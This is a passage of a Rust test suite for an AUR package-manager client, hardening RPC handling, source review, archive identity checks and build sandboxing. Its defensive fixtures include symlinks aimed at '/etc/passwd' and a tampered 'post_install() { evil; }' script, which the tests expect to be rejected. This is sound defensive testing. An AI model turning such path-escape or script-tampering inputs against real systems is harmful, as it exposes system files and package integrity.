            "package_managers::aur::client::tests::aur_rpc_updates_rejects_unsolicited_installed_official_package",
        ) {
            return Ok(());
        }
        if Settings::rerun_test_unprivileged(
            "package_managers::aur::client::tests::aur_rpc_updates_rejects_unsolicited_installed_official_package",
        ) {
            return Ok(());
        }
        let fixture = S72Fixture::new(&["aur-demo", "core-demo"])?;
        fixture.with_environment(async {
            let desc = b"%NAME%\ncore-demo\n\n%VERSION%\n2.0-1\n\n%DESC%\nS72 official fixture\n\n";
            let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
            let mut archive = tar::Builder::new(encoder);
            let mut header = tar::Header::new_gnu();
            header.set_size(desc.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            archive.append_data(&mut header, "core-demo-2.0-1/desc", &desc[..])?;
            let compressed = archive.into_inner()?.finish()?;
            let sync_path = fixture.db.join("sync/core.db");
            std::fs::write(&sync_path, compressed)?;
            std::fs::write(
                &fixture.conf,
                "[options]\n[core]\nServer = https://example.invalid/$repo/$arch\n",
            )?;
            pacman_db::invalidate_caches()?;
            let foreign = get_potential_aur_packages()?;
            assert_eq!(
                foreign,
                ["aur-demo"],
                "fixture must prove core-demo is official and unrequested"
            );
            let local_before = fixture.local_bytes()?;
            let sync_before = std::fs::read(&sync_path)?;
            let (endpoint, server) =
                rpc_body_server(s72_rpc_json(&[("core-demo", "3.0-1")]), false).await?;
            let result = tokio::time::timeout(
                Duration::from_secs(5),
                fixture.client().query_aur_updates_at(&endpoint, &foreign),
            )
            .await?;
            tokio::time::timeout(Duration::from_secs(5), server).await???;
            let error =
                result.expect_err("RPC must not relabel an installed official package as AUR");
            assert!(
                format!("{error:#}").contains("AUR RPC response was invalid"),
                "{error:#}"
            );
            assert_eq!(fixture.local_bytes()?, local_before);
            assert_eq!(std::fs::read(&sync_path)?, sync_before);
            Ok(())
        })
    }

    async fn rpc_body_server(
        body: Vec<u8>,
        chunked: bool,
    ) -> Result<(String, tokio::task::JoinHandle<Result<()>>)> {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
        let endpoint = format!("http://{}/rpc", listener.local_addr()?);
        let server = tokio::spawn(async move {
            let (mut stream, _) = listener.accept().await?;
            let mut request = [0_u8; 4096];
            anyhow::ensure!(stream.read(&mut request).await? > 0, "empty request");
            let mut wire = if chunked {
                b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
                    .to_vec()
            } else {
                format!(
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                    body.len()
                )
                .into_bytes()
            };
            if chunked {
                for chunk in body.chunks(8192) {
                    wire.extend_from_slice(format!("{:x}\r\n", chunk.len()).as_bytes());
                    wire.extend_from_slice(chunk);
                    wire.extend_from_slice(b"\r\n");
                }
                wire.extend_from_slice(b"0\r\n\r\n");
            } else {
                wire.extend_from_slice(&body);
            }
            // Size rejection may close the connection before the fixture is sent.
            if let Err(error) = stream.write_all(&wire).await {
                anyhow::ensure!(
                    matches!(
                        error.kind(),
                        std::io::ErrorKind::BrokenPipe | std::io::ErrorKind::ConnectionReset
                    ),
                    "fixture write failed: {error}"
                );
            }
            anyhow::Ok(())
        });
        Ok((endpoint, server))
    }

    fn rpc_json_of_size(size: usize) -> Vec<u8> {
        let mut body = br#"{"type":"info","results":[],"padding":""#.to_vec();
        body.resize(size - 2, b'x');
        body.extend_from_slice(b"\"}");
        body
    }

    #[tokio::test]
    async fn aur_rpc_body_limit_rejects_declared_and_chunked_oversized_json() -> Result<()> {
        for chunked in [false, true] {
            let (endpoint, server) =
                rpc_body_server(rpc_json_of_size(16 * 1024 * 1024 + 1), chunked).await?;
            let response = reqwest::Client::builder()
                .no_proxy()
                .build()?
                .get(endpoint)
                .send()
                .await?;
            let error = decode_aur_rpc_response::<AurResponse>(response)
                .await
                .expect_err("oversized valid JSON must be rejected");
            assert!(error.to_string().contains("16 MiB"), "{error:#}");
            server.await??;
        }
        Ok(())
    }

    #[tokio::test]
    async fn aur_rpc_body_limit_applies_to_update_info_chunks() -> Result<()> {
        for chunked in [false, true] {
            let (endpoint, server) =
                rpc_body_server(rpc_json_of_size(16 * 1024 * 1024 + 1), chunked).await?;
            let error = AurClient::rpc_info_chunk_at(&endpoint, &["example".to_string()])
                .await
                .expect_err("update responses must use the metadata limit");
            assert!(error.to_string().contains("16 MiB"), "{error:#}");
            server.await??;
        }
        Ok(())
    }

    #[tokio::test]
    async fn aur_rpc_body_limit_rejects_chunked_json_without_content_length() -> Result<()> {
        let (endpoint, server) =
            rpc_body_server(rpc_json_of_size(16 * 1024 * 1024 + 1), true).await?;
        let response = reqwest::Client::builder()
            .no_proxy()
            .build()?
            .get(endpoint)
            .send()
            .await?;
        assert_eq!(response.content_length(), None);
        let error = decode_aur_rpc_response::<AurResponse>(response)
            .await
            .expect_err("streamed oversized JSON must be rejected without Content-Length");
        assert!(error.to_string().contains("16 MiB"), "{error:#}");
        server.await??;
        Ok(())
    }

    #[tokio::test]
    async fn aur_rpc_body_limit_accepts_exact_limit_json() -> Result<()> {
        let (endpoint, server) = rpc_body_server(rpc_json_of_size(16 * 1024 * 1024), true).await?;
        let response = reqwest::Client::builder()
            .no_proxy()
            .build()?
            .get(endpoint)
            .send()
            .await?;
        assert!(
            decode_aur_rpc_response::<AurResponse>(response)
                .await?
                .results
                .is_empty()
        );
        server.await??;
        Ok(())
    }

    #[tokio::test]
    async fn aur_rpc_body_limit_preserves_rpc_error_envelopes() -> Result<()> {
        let (endpoint, server) = rpc_body_server(
            br#"{"type":"error","error":"fixture RPC error"}"#.to_vec(),
            true,
        )
        .await?;
        let response = reqwest::Client::builder()
            .no_proxy()
            .build()?
            .get(endpoint)
            .send()
            .await?;
        let error = decode_aur_rpc_response::<AurResponse>(response)
            .await
            .unwrap_err();
        assert_eq!(
            error.to_string(),
            "AUR RPC returned an error: fixture RPC error"
        );
        server.await??;
        Ok(())
    }

    #[tokio::test]
    async fn aur_rpc_body_limit_redacts_body_transport_errors() -> Result<()> {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
        let endpoint = format!("http://{}/rpc?arg=private-query", listener.local_addr()?);
        let server = tokio::spawn(async move {
            let (mut stream, _) = listener.accept().await?;
            let mut request = [0_u8; 2048];
            anyhow::ensure!(stream.read(&mut request).await? > 0, "empty request");
            stream
                .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 64\r\n\r\n{")
                .await?;
            stream.shutdown().await?;
            anyhow::Ok(())
        });
        let response = reqwest::Client::builder()
            .no_proxy()
            .build()?
            .get(endpoint)
            .send()
            .await?;
        let error = decode_aur_rpc_response::<AurResponse>(response)
            .await
            .unwrap_err();
        assert_eq!(
            error.to_string(),
            "AUR RPC transport failed. Check your internet connection."
        );
        assert!(!format!("{error:#}").contains("private-query"));
        server.await??;
        Ok(())
    }

    #[cfg(unix)]
    #[test]
    fn sandbox_helper_resolves_outside_the_callers_path() {
        let command = sandbox_command_with(Path::new("/home/builder"), "builder", |program| {
            assert_eq!(program, "bwrap");
            Ok(PathBuf::from("/usr/bin/bwrap"))
        })
        .expect("trusted bubblewrap installation");
        assert!(Path::new(command.as_std().get_program()).is_absolute());
    }

    #[test]
    fn auto_makeflags_divide_cores_across_concurrent_builds() {
        assert_eq!(compiler_job_flags(None, None, 16, 1), "-j16");
        assert_eq!(compiler_job_flags(None, None, 16, 4), "-j4");
        assert_eq!(compiler_job_flags(None, None, 8, 8), "");
        assert_eq!(compiler_job_flags(Some("-j2"), None, 16, 8), "-j2");
        assert_eq!(compiler_job_flags(None, Some("-j32"), 16, 8), "-j32");
        assert_eq!(compiler_job_flags(Some("-j2"), Some("-j32"), 16, 8), "-j2");
        assert_eq!(compiler_job_flags(None, None, 16, 0), "-j16");
    }

    #[tokio::test]
    async fn aur_rpc_transport_error_redacts_query_from_display_and_sources() -> Result<()> {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
        let query = "private-aur-query";
        let url = format!(
            "http://{}/rpc?v=5&type=search&arg={query}",
            listener.local_addr()?
        );
        let server = tokio::spawn(async move {
            let (stream, _) = listener.accept().await?;
            drop(stream);
            anyhow::Ok(())
        });

        let transport_error = reqwest::Client::new()
            .get(url)
            .send()
            .await
            .expect_err("closed connection must produce a transport error");
        server.await??;
        assert!(transport_error.to_string().contains(query));

        let error = redact_aur_transport_error(transport_error);
        let mut rendered_chain = error.to_string();
        let mut source = error.source();
        while let Some(cause) = source {
            rendered_chain.push_str(&cause.to_string());
            source = cause.source();
        }

        assert!(!rendered_chain.contains(query), "got: {rendered_chain}");
        assert!(!rendered_chain.contains("arg="), "got: {rendered_chain}");
        Ok(())
    }

    #[tokio::test]
    async fn rpc_info_chunk_retries_a_truncated_response_body() -> Result<()> {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
        let endpoint = format!("http://{}/rpc", listener.local_addr()?);
        let server = tokio::spawn(async move {
            let (mut first, _) = listener.accept().await?;
            let mut request = [0_u8; 2048];
            let first_request_len = first.read(&mut request).await?;
            anyhow::ensure!(first_request_len > 0, "first request was empty");
            first
                .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 64\r\n\r\n{\"results\":")
                .await?;
            first.shutdown().await?;

            let (mut second, _) = listener.accept().await?;
            let second_request_len = second.read(&mut request).await?;
            anyhow::ensure!(second_request_len > 0, "second request was empty");
            let body = br#"{"type":"info","resultcount":0,"results":[]}"#;
            second
                .write_all(
                    format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n", body.len()).as_bytes(),
                )
                .await?;
            second.write_all(body).await?;
            second.shutdown().await?;
            anyhow::Ok(())
        });

        let response = AurClient::rpc_info_chunk_at(&endpoint, &["example".to_string()]).await?;
        assert!(response.results.is_empty());
        server.await??;
        Ok(())
    }

    #[test]
    fn source_additions_and_duplicate_archive_fields_are_rejected() -> Result<()> {
        let directory = tempfile::tempdir()?;
        std::fs::write(
            directory.path().join("PKGBUILD"),
            "source ./optional-helper\n",
        )?;
        std::fs::write(
            directory.path().join(".SRCINFO"),
            "pkgbase = example\npkgname = example\n",
        )?;
        let source = ReviewedSource::capture(directory.path())?;
        source.verify(directory.path())?;
        std::fs::write(directory.path().join("optional-helper"), "evil\n")?;
        assert!(source.verify(directory.path()).is_err());
        let valid = "pkgname = example\npkgver = 1-1\npkgbase = example\n";
        assert!(AurClient::parse_pkginfo_identity(valid).is_some());
        for extra in ["pkgname = other\n", "pkgver = 2-1\n", "pkgbase = other\n"] {
            assert!(AurClient::parse_pkginfo_identity(&format!("{valid}{extra}")).is_none());
        }
        Ok(())
    }

    async fn replaced_reviewed_source_fixture() -> Result<(tempfile::TempDir, ReviewedSource)> {
        let directory = tempfile::tempdir()?;
        std::fs::write(directory.path().join("PKGBUILD"), "pkgname=demo\n")?;
        let srcinfo = directory.path().join(".SRCINFO");
        std::fs::write(
            &srcinfo,
            "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\nsource = https://example.org/reviewed.tar.gz\nsource = git+https://example.org/reviewed.git\npkgname = demo\n",
        )?;
        let reviewed = ReviewedSource::capture(directory.path())?;
        tokio::task::yield_now().await;
        std::fs::write(
            &srcinfo,
            "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\nsource = https://example.org/replacement.tar.gz\nsource = git+https://example.org/replacement.git\npkgname = demo\n",
        )?;

        Ok((directory, reviewed))
    }

    #[tokio::test]
    async fn reviewed_http_prefetch_uses_captured_metadata_after_checkout_changes() -> Result<()> {
        let (_directory, reviewed) = replaced_reviewed_source_fixture().await?;
        let http = http_sources(reviewed.required_srcinfo("demo")?.as_ref());
        assert_eq!(http[0].url, "https://example.org/reviewed.tar.gz");
        Ok(())
    }

    #[tokio::test]
    async fn reviewed_vcs_prefetch_uses_captured_metadata_after_checkout_changes() -> Result<()> {
        let (_directory, reviewed) = replaced_reviewed_source_fixture().await?;
        let vcs = vcs_sources(reviewed.required_srcinfo("demo")?.as_ref());
        assert_eq!(vcs[0].url, "https://example.org/reviewed.git");
        Ok(())
    }

    #[test]
    fn contained_license_symlink_is_reviewed_by_target() -> Result<()> {
        let directory = tempfile::tempdir()?;
        std::fs::write(directory.path().join("PKGBUILD"), "pkgname=demo\n")?;
        std::fs::write(directory.path().join(".SRCINFO"), "pkgbase = demo\n")?;
        std::fs::write(directory.path().join("LICENSE"), "0BSD\n")?;
        std::fs::create_dir(directory.path().join("LICENSES"))?;
        std::os::unix::fs::symlink("../LICENSE", directory.path().join("LICENSES/0BSD.txt"))?;

        let source = ReviewedSource::capture(directory.path())?;
        source.verify(directory.path())?;
        assert!(source.files.contains_key(Path::new("LICENSES/0BSD.txt")));
        Ok(())
    }

    #[test]
    fn live_antigravity_checkout_is_reviewable_when_present() -> Result<()> {
        let path = PathBuf::from(std::env::var("HOME").unwrap_or_default())
            .join(".cache/omg/aur/antigravity");
        if !path.join("PKGBUILD").is_file() {
            return Ok(());
        }
        ReviewedSource::capture(&path).with_context(|| format!("capture {}", path.display()))?;
        Ok(())
    }

    #[test]
    fn escaping_and_absolute_source_symlinks_are_rejected() -> Result<()> {
        let directory = tempfile::tempdir()?;
        std::fs::write(directory.path().join("PKGBUILD"), "pkgname=demo\n")?;
        std::fs::write(directory.path().join(".SRCINFO"), "pkgbase = demo\n")?;
        std::os::unix::fs::symlink("../../etc/passwd", directory.path().join("escape"))?;
        let error = ReviewedSource::capture(directory.path()).expect_err("escape");
        assert!(
            error.to_string().contains("escapes the checkout"),
            "{error}"
        );

        std::fs::remove_file(directory.path().join("escape"))?;
        std::os::unix::fs::symlink("/etc/passwd", directory.path().join("absolute"))?;
        let error = ReviewedSource::capture(directory.path()).expect_err("absolute");
        assert!(error.to_string().contains("must be relative"), "{error}");
        Ok(())
    }

    #[test]
    fn pkgbuild_symlink_is_rejected() -> Result<()> {
        let directory = tempfile::tempdir()?;
        std::fs::write(directory.path().join("real-pkgbuild"), "pkgname=demo\n")?;
        std::fs::write(directory.path().join(".SRCINFO"), "pkgbase = demo\n")?;
        std::os::unix::fs::symlink("real-pkgbuild", directory.path().join("PKGBUILD"))?;
        let error = ReviewedSource::capture(directory.path()).expect_err("pkgbuild link");
        assert!(
            error.to_string().contains("must be a regular file"),
            "{error}"
        );
        Ok(())
    }

    #[test]
    fn vcs_version_changes_are_authorized_only_for_fresh_outputs() -> Result<()> {
        let directory = tempfile::tempdir()?;
        std::fs::write(
            directory.path().join("PKGBUILD"),
            "pkgname=demo\npkgver() { echo 2; }\n",
        )?;
        std::fs::write(
            directory.path().join(".SRCINFO"),
            "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\n",
        )?;
        let source = ReviewedSource::capture(directory.path())?;
        let archive_dir = tempfile::tempdir()?;
        let archive = archive_dir.path().join("demo-2-1-any.pkg.tar.gz");
        write_pkg_archive(
            &archive,
            "pkgname = demo\npkgbase = demo\npkgver = 2-1\n",
            None,
        );
        let paths = [archive];
        let outputs = ["demo".to_owned()];
        assert!(AurClient::authorize_archives(&paths, &source, "demo", &outputs, true).is_ok());
        assert!(AurClient::authorize_archives(&paths, &source, "demo", &outputs, false).is_err());
        Ok(())
    }

    #[test]
    fn reviewed_source_and_fresh_archive_share_one_authorization_boundary() -> Result<()> {
        let directory = tempfile::tempdir()?;
        std::fs::write(
            directory.path().join("PKGBUILD"),
            "pkgname=demo\npkgver=1\n",
        )?;
        std::fs::write(
            directory.path().join(".SRCINFO"),
            "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\ninstall = demo.install\npkgname = demo\n",
        )?;
        std::fs::write(
            directory.path().join("demo.install"),
            "post_install() { :; }\n",
        )?;
        let source = ReviewedSource::capture(directory.path())?;
        let archive_dir = tempfile::tempdir()?;
        let archive = archive_dir.path().join("demo-1-1-any.pkg.tar.gz");
        // write_pkg_archive supplies the fixture's single `arch = any` field.
        let info = "pkgname = demo\npkgbase = demo\npkgver = 1-1\n";
        write_pkg_archive(&archive, info, Some("post_install() { :; }\n"));
        let accepted = AurClient::authorize_archives(
            std::slice::from_ref(&archive),
            &source,
            "demo",
            &["demo".to_owned()],
            true,
        )?;
        write_pkg_archive(&archive, info, Some("post_install() { evil; }\n"));
        assert!(
            AurClient::authorize_archives(
                std::slice::from_ref(&archive),
                &source,
                "demo",
                &["demo".to_owned()],
                true
            )
            .is_err()
        );
        // The previously approved snapshot still carries the original bytes.
        let identity =
            AurClient::cached_archive_identity(Path::new(&accepted[0].handoff()))?.unwrap();
        assert_eq!(
            identity.install_script.as_deref(),
            Some("post_install() { :; }\n")
        );
        std::fs::write(directory.path().join("demo.install"), "changed")?;
        assert!(source.verify(directory.path()).is_err());
        assert!(
            AurClient::authorize_archives(&[], &source, "demo", &["demo".to_owned()], true)
                .is_err()
        );
        Ok(())
    }

    #[tokio::test]
    async fn native_child_cannot_gain_new_privileges() -> Result<()> {
        // Exercise the real setpriv boundary without sudo or package mutation.
        let output = Command::new(crate::core::privilege::root_controlled_program_path(
            "setpriv",
        )?)
        .args(["--no-new-privs", "--", "/usr/bin/cat", "/proc/self/status"])
        .output()
        .await?;
        assert!(output.status.success());
        assert!(String::from_utf8(output.stdout)?.contains("NoNewPrivs:\t1"));
        let command = native_build_command()?;
        assert!(
            command
                .as_std()
                .get_args()
                .any(|argument| argument == "--no-new-privs")
        );
        Ok(())
    }

    #[test]
    fn aur_rpc_error_envelope_is_not_an_empty_success() {
        let error = decode_aur_rpc_body::<AurResponse>(
            br#"{"type":"error","error":"Incorrect request type specified.","results":"malformed"}"#,
        )
        .expect_err("AUR RPC error envelopes must fail");

        assert!(
            error
                .to_string()
                .contains("Incorrect request type specified.")
        );
    }

    #[test]
    fn aur_rpc_success_envelope_still_decodes() {
        let response = decode_aur_rpc_body::<AurResponse>(
            br#"{"type":"search","resultcount":0,"results":[]}"#,
        )
        .expect("valid AUR RPC response");

        assert!(response.results.is_empty());
        let response = decode_aur_rpc_body::<AurResponse>(&s72_rpc_json(&[("aur-demo", "2.0-1")]))
            .expect("valid nonempty AUR RPC response");
        let identities: Vec<_> = response
            .results
            .iter()
            .map(|package| (package.name.as_str(), package.version.as_str()))
            .collect();
        assert_eq!(identities, [("aur-demo", "2.0-1")]);
    }

    #[test]
    fn aur_rpc_http_error_uses_redacted_endpoint() {
        let error = ensure_aur_rpc_success(reqwest::StatusCode::SERVICE_UNAVAILABLE)
            .expect_err("non-success statuses must fail");
        let message = error.to_string();

        assert!(message.contains("503 Service Unavailable"));
        assert!(message.contains(AUR_RPC_URL));
        assert!(!message.contains("arg="));
    }

    fn write_tar_gz(path: &std::path::Path, entries: &[(&str, &[u8])]) {
        let encoder = flate2::write::GzEncoder::new(
            std::fs::File::create(path).unwrap(),
            flate2::Compression::fast(),
        );
        let mut tar = tar::Builder::new(encoder);
        for (name, content) in entries {
            let mut header = tar::Header::new_gnu();
            header.set_size(content.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar.append_data(&mut header, name, *content).unwrap();
        }
        tar.into_inner().unwrap().finish().unwrap();
    }

    #[test]
    fn pkginfo_parser_tolerates_partial_metadata_and_rejects_duplicate_keys() {
        assert_eq!(
            AurClient::parse_pkginfo_name_version("pkgname = example\npkgver = 1.0-1\n"),
            Some(("example".to_string(), "1.0-1".to_string()))
        );
        // Reject parser ambiguity rather than choosing an occurrence.
        assert_eq!(
            AurClient::parse_pkginfo_name_version(
                "pkgname = first\npkgname = second\npkgver = a\npkgver = b\n"
            ),
            None
        );
        // Missing either required key fails closed.
        assert_eq!(
            AurClient::parse_pkginfo_name_version("pkgname = example\n"),
            None
        );
        assert_eq!(
            AurClient::parse_pkginfo_name_version("pkgver = 1.0-1\n"),
            None
        );
        assert_eq!(
            AurClient::parse_pkginfo_name_version("desc = other stuff\n"),
            None
        );
        // Value trimming is part of the tolerated surface.
        assert_eq!(
            AurClient::parse_pkginfo_name_version("  pkgname =   spaced  \n pkgver =  2.0 \n"),
            Some(("spaced".to_string(), "2.0".to_string()))
        );
    }

    fn write_discovery_archive(directory: &Path, filename_name: &str, pkgname: &str) -> PathBuf {
        let path = directory.join(format!("{filename_name}-1-1-any.pkg.tar.zst"));
        let encoder = zstd::Encoder::new(File::create(&path).unwrap(), 0).unwrap();
        let mut archive = tar::Builder::new(encoder);
        let info = format!("pkgname = {pkgname}\npkgver = 1-1\narch = any\n");
        let mut header = tar::Header::new_gnu();
        header.set_size(info.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        archive
            .append_data(&mut header, ".PKGINFO", info.as_bytes())
            .unwrap();
        archive.into_inner().unwrap().finish().unwrap();
        path
    }

    #[tokio::test]
    async fn built_package_discovery_accepts_requested_debug_named_output() {
        let directory = tempfile::tempdir().unwrap();
        for name in ["docker-debug", "docker-debug-tools"] {
            let archive = write_discovery_archive(directory.path(), name, name);
            assert_eq!(
                AurClient::find_built_packages(
                    directory.path(),
                    directory.path(),
                    &[name.to_string()]
                )
                .await
                .unwrap(),
                vec![archive]
            );
        }
    }

    #[tokio::test]
    async fn built_package_discovery_accepts_requested_debug_named_split_outputs() {
        let directory = tempfile::tempdir().unwrap();
        let main = write_discovery_archive(directory.path(), "docker", "docker");
        let debug = write_discovery_archive(directory.path(), "docker-debug", "docker-debug");
        write_discovery_archive(directory.path(), "docker-debug-debug", "docker-debug-debug");
        assert_eq!(
            AurClient::find_built_packages(
                directory.path(),
                directory.path(),
                &["docker-debug".to_string(), "docker".to_string()],
            )
            .await
            .unwrap(),
            vec![debug, main]
        );
    }

    #[tokio::test]
    async fn built_package_discovery_does_not_add_unrequested_debug_outputs() {
        let directory = tempfile::tempdir().unwrap();
        write_discovery_archive(directory.path(), "docker-debug", "docker-debug");
        let requested = ["docker".to_string()];
        assert!(
            AurClient::find_built_packages(directory.path(), directory.path(), &requested)
                .await
                .is_err()
        );
        let main = write_discovery_archive(directory.path(), "docker", "docker");
        assert_eq!(
            AurClient::find_built_packages(directory.path(), directory.path(), &requested)
                .await
                .unwrap(),
            vec![main]
        );
    }

    #[test]
    fn built_package_discovery_rejects_mismatched_debug_named_identity() {
        let directory = tempfile::tempdir().unwrap();
        write_discovery_archive(directory.path(), "docker-debug", "unrelated");
        assert_eq!(
            AurClient::find_package_in_dir(directory.path(), &["docker-debug".to_string()]),
            None
        );
    }

    #[test]
    fn built_package_discovery_rejects_unreadable_archive_identity() {
        let directory = tempfile::tempdir().unwrap();
        let archive = directory.path().join("requested-1.0-1-x86_64.pkg.tar.zst");
        std::fs::write(&archive, b"not a package archive").unwrap();

        assert_eq!(
            AurClient::find_package_in_dir(directory.path(), &["requested".to_string()]),
            None
        );
    }

    #[test]
    fn build_only_rejects_cached_archives_with_mismatched_identity() {
        let directory = tempfile::tempdir().unwrap();
        let pkg_dir = directory.path().join("pkg");
        std::fs::create_dir(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join(".SRCINFO"),
            "pkgbase = requested\npkgver = 1.0\npkgrel = 1\n\npkgname = requested\n",
        )
        .unwrap();
        let archive = directory.path().join("requested.pkg.tar.gz");
        write_tar_gz(
            &archive,
            &[(".PKGINFO", b"pkgname = different\npkgver = 1.0-1\n")],
        );

        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![archive],
                &["requested".to_string()],
                &pkg_dir,
                "requested"
            ),
            None
        );
    }

    #[test]
    fn archive_identity_reader_requires_a_readable_root_pkginfo() {
        let directory = tempfile::tempdir().unwrap();

        let with_pkginfo = directory.path().join("with.pkg.tar.gz");
        write_tar_gz(
            &with_pkginfo,
            &[(".PKGINFO", b"pkgname = example\npkgver = 1.0-1\n")],
        );
        assert_eq!(
            AurClient::pkg_name_and_version_from_archive(&with_pkginfo),
            Some(("example".to_string(), "1.0-1".to_string()))
        );

        // Corrupt gzip fails closed instead of yielding an identity.
        let corrupt = directory.path().join("corrupt.pkg.tar.gz");
        std::fs::write(&corrupt, b"not a gzip archive").unwrap();
        assert_eq!(AurClient::pkg_name_and_version_from_archive(&corrupt), None);

        // An archive without .PKGINFO cannot claim any identity.
        let empty = directory.path().join("empty.pkg.tar.gz");
        write_tar_gz(&empty, &[]);
        assert_eq!(AurClient::pkg_name_and_version_from_archive(&empty), None);

        // PKGINFO-like entries nested deeper than two components are ignored.
        let deep = directory.path().join("deep.pkg.tar.gz");
        write_tar_gz(
            &deep,
            &[("a/b/.PKGINFO", b"pkgname = deep\npkgver = 9.9\n")],
        );
        assert_eq!(AurClient::pkg_name_and_version_from_archive(&deep), None);

        // Metadata is untrusted and must not cause unbounded allocation.
        let oversized = directory.path().join("oversized.pkg.tar.gz");
        let mut pkginfo = b"pkgname = oversized\npkgver = 1.0-1\n".to_vec();
        pkginfo.resize((MAX_PKGINFO_BYTES + 1) as usize, b'x');
        write_tar_gz(&oversized, &[(".PKGINFO", &pkginfo)]);
        assert_eq!(
            AurClient::pkg_name_and_version_from_archive(&oversized),
            None
        );
    }

    #[test]
    fn xz_package_metadata_scan_enforces_decompressed_budget() {
        let directory = tempfile::tempdir().unwrap();
        let path = directory.path().join("oversized.pkg.tar.xz");
        let content = vec![b'x'; 1024];
        let mut tar = tar::Builder::new(Vec::new());
        let mut header = tar::Header::new_gnu();
        header.set_size(content.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        tar.append_data(&mut header, "payload", content.as_slice())
            .unwrap();
        let raw = tar.into_inner().unwrap();
        let mut compressed = Vec::new();
        lzma_rs::xz_compress(&mut raw.as_slice(), &mut compressed).unwrap();
        std::fs::write(&path, compressed).unwrap();

        let error = AurClient::package_archive_reader(&path, 128)
            .err()
            .expect("oversized XZ output must fail before it is retained in memory");
        assert!(
            error.to_string().contains("xz"),
            "unexpected error: {error:#}"
        );
    }

    #[test]
    fn sandbox_launcher_uses_bwrap_directly_and_detaches_the_tty() {
        let command = sandbox_command_with(Path::new("/home/builder"), "builder", |_| {
            Ok(PathBuf::from("/usr/bin/bwrap"))
        })
        .unwrap();
        let command = command.as_std();
        let args: Vec<_> = command.get_args().collect();

        assert!(Path::new(command.get_program()).is_absolute());
        assert_eq!(
            Path::new(command.get_program()).file_name().unwrap(),
            "bwrap"
        );
        assert!(args.contains(&"--new-session".as_ref()));
        assert!(args.contains(&"--die-with-parent".as_ref()));
        assert!(args.contains(&"--unshare-pid".as_ref()));
        assert!(!args.contains(&"setsid".as_ref()));
    }

    #[cfg(target_os = "linux")]
    fn spawn_logged_sandbox_fixture(
        client: AurClient,
        mut command: Command,
        package: &'static str,
    ) -> tokio::task::JoinHandle<Result<std::process::ExitStatus>> {
        tokio::spawn(async move {
            client
                .run_logged_build_command(&mut command, package, BuildIsolation::ProcessGroup)
                .await
        })
    }

    #[cfg(target_os = "linux")]
    async fn logged_sandbox_fixture_readiness(
        listener: &tokio::net::TcpListener,
        runner: &mut tokio::task::JoinHandle<Result<std::process::ExitStatus>>,
        log_path: &Path,
    ) -> tokio::net::TcpStream {
        tokio::select! {
            result = tokio::time::timeout(Duration::from_secs(5), listener.accept()) => {
                result.expect("build child must signal readiness").expect("accept readiness").0
            }
            result = runner => {
                let log = std::fs::read_to_string(log_path).unwrap_or_default();
                panic!("sandbox exited before child readiness: {result:?}\nlog:\n{log}");
            }
        }
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    #[ignore = "requires bubblewrap and permission to create PID namespaces"]
    async fn cancelling_logged_sandbox_build_terminates_descendants() {
        use futures::FutureExt as _;
        use rustix::process::{Pid, PidfdFlags, Signal, pidfd_open, pidfd_send_signal};
        use tokio::io::{AsyncBufReadExt, unix::AsyncFd};

        let directory = tempfile::tempdir().expect("isolated build logs");
        let client = AurClient {
            build_dir: directory.path().to_path_buf(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port().to_string();
        let log_path = client.build_log_path("fixture");
        let early_log = client.build_log_path("early-fixture");
        let spawn_early_exit = |package| {
            let mut command = Command::new("/bin/sh");
            command.args(["-c", "printf 'early-exit-fixture\\n'; exit 23"]);
            spawn_logged_sandbox_fixture(client.clone(), command, package)
        };
        let mut completed = spawn_early_exit("early-completion");
        let _abort_completed = scopeguard::guard(completed.abort_handle(), |handle| handle.abort());
        let status = tokio::time::timeout(Duration::from_secs(5), &mut completed)
            .await
            .expect("early-exit control must finish promptly")
            .expect("early-exit build task must not panic")
            .expect("early-exit build command must run");
        assert_eq!(status.code(), Some(23));

        let mut early_runner = spawn_early_exit("early-fixture");
        let _abort_early = scopeguard::guard(early_runner.abort_handle(), |handle| handle.abort());
        let failure = std::panic::AssertUnwindSafe(logged_sandbox_fixture_readiness(
            &listener,
            &mut early_runner,
            &early_log,
        ))
        .catch_unwind()
        .await
        .expect_err("a build that exits before readiness must fail the fixture");
        let diagnostic = failure
            .downcast_ref::<String>()
            .expect("readiness diagnostic");
        assert!(diagnostic.contains("sandbox exited before child readiness"));
        assert!(diagnostic.contains("early-exit-fixture"));
        assert!(early_runner.is_finished());

        let mut command = sandbox_command(directory.path(), "builder").unwrap();
        // Keep the host /proc mount so the child can report its host PID after
        // PID isolation. Production mounts a fresh /proc instead. Do not bind
        // the whole host root: a read-only /dev makes `cmd &` fail opening
        // /dev/null, and Docker cgroup mounts break --ro-bind / /. A socket
        // provides readiness and bounds the child's lifetime if setup fails.
        command.args([
            "--ro-bind",
            "/usr",
            "/usr",
            "--ro-bind",
            "/lib",
            "/lib",
            "--ro-bind",
            "/lib64",
            "/lib64",
            "--symlink",
            "/usr/bin",
            "/bin",
            "--ro-bind",
